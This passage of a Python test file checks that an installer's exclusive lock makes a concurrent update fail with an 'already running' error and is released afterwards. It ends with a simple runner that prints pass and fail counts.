    other = Layout(home=os.path.join(box, "home"), config_dir=os.path.join(box, "cfg"))
    with layout.exclusive("install"):
        exc = assert_raises(
            ExitError, lambda: other.exclusive("update", timeout=0.2).__enter__()
        )
        assert exc.code == Exit.INSTALL_FAILED, exc.code
        assert "already running" in exc.message, exc.message
    # Released on exit, so the next operation proceeds.
    with other.exclusive("update", timeout=1.0):
        pass


def main():
    for test in TESTS:
        test()
    for name in PASSED:
        print("  ok    {}".format(name))
    for name, detail in FAILED:
        print("  FAIL  {}".format(name))
        print(detail)
    print("")
    print("{} passed, {} failed".format(len(PASSED), len(FAILED)))
    return 1 if FAILED else 0


if __name__ == "__main__":
    sys.exit(main())
